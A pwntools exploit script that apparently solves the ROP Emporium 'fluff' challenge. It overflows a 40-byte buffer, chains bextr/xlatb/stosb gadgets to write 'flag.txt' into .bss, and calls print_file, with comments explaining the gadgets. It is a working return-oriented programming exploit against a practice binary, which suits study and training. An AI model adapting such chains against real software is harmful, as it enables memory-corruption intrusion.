
from pwn import *

gdbcmd = '''b * pwnme'''
		

#target = process("./fluff")
target = gdb.debug("./fluff", gdbscript = gdbcmd)
bextr = p64(0x40062a)
xlatb = p64(0x400628)
bss_addr = 0x601040
length = p64(0x4000)
ret = p64(0x400295)
stosb = p64(0x400639)
print_file = p64(0x400620)
pop_rdi = p64(0x4006a3)

flag_locations = [0x4003e2, 0x400242, 0x400411, 0x4003cf, 0x40024e, 0x400192,0x400246, 0x400192]
flag =[ 0xb,
ord('f'),
ord('l'),
 ord('a'),
 ord('g'),
 ord('.'),
 ord('t'),
 ord('x'),
ord('t')]

def add_letter(payload, letter,i):
	payload = bextr
	payload += length
	payload += p64(letter - flag[i])
	payload += xlatb
	payload += pop_rdi
	payload += p64(bss_addr+i)
	payload += stosb

	return payload
	
'''
Start  = RDX & 0xFF = 0x0000
Length = (RDX >> 8) & 0xFF = 0x40

RBX = (RCX >> Start) & ((1 << Length) - 1)
    = (RCX) & (0xfffffff) = RCX
XLATB -> AL :=DS:[RBX+AL]
'''

payload = b""
payload += b"A" * 40


for i in range(8):
	payload += add_letter(payload, flag_locations[i]-0x3ef2, i)

payload += pop_rdi
payload += p64(bss_addr)
#payload += ret
payload += print_file
target.sendline(payload)

target.interactive()

'''
questionable gadgets :
0x000000000040062a : pop rdx, pop rcx, add 0x3ef2, rcx, bextr rbx, rcx, rdx ; ret
0x0000000000400628 : xlatb ; ret
0x0000000000400630 : add byte ptr ds:[rax], al ; bextr rbx, rcx, rdx ; ret
0x0000000000400631 : add byte ptr [rax], al ; bextr rbx, rcx, rdx ; ret
0x0000000000400632 : add ah, al ; loop 0x40061e ; neg ecx ; ret
0x0000000000400633 : bextr rbx, rcx, rdx ; ret
0x0000000000400634 : loop 0x40061e ; neg ecx ; ret
0x0000000000400636 : neg ecx ; ret
0x0000000000400637 : fld st(3) ; stosb byte ptr [rdi], al ; ret
0x0000000000400639 : stosb byte ptr [rdi], al ; ret
0x00000000004006a3 : pop rdi ; ret
'''